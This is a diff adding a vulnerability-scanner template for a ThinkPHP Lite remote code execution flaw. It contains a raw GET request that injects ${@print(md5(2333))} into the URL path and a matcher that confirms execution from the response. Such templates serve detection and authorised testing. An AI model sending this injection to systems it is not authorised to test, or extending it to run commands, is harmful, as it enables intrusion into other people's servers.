@@ -1,0 +1,22 @@
+id: thinkphp-lite-code-exec
+
+info:
+  name: ThinkPHP Lite 远程代码执行漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+      
+      ThinkPHP Lite 框架存在远程代码执行漏洞，攻击者可通过构造恶意请求在目标系统上执行任意命令。该漏洞源于框架对用户输入的代码未进行有效过滤，结合特定接口可实现代码注入攻击。成功利用该漏洞可导致系统被完全控制，敏感数据泄露或服务中断。参考信息请见官方安全公告。
+  tags: thinkphp
+
+http:
+- raw:
+  - |
+    GET /index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '56540676a129760a3'
